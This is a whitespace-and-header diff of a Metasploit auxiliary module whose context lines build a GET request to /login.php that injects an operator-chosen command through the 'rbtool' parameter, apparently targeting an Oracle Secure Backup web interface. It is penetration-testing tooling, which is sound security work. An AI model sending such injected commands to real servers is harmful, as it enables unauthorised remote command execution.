@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -44,14 +48,14 @@ class Metasploit3 < Msf::Auxiliary
 		cmd = datastore['CMD']
 
 		uri = "/login.php?clear=no&ora_osb_lcookie=&ora_osb_bgcookie=#{r}&button=Logout&rbtool="
-		
+
 		req = uri + Rex::Text.uri_encode(cmd)
-		
+
 		print_status("Sending command: #{datastore['CMD']}...")
 
 		res = send_request_raw({'uri' => req,},5)
-		
+
 		print_status("Done.")
-		
+
 	end
 end
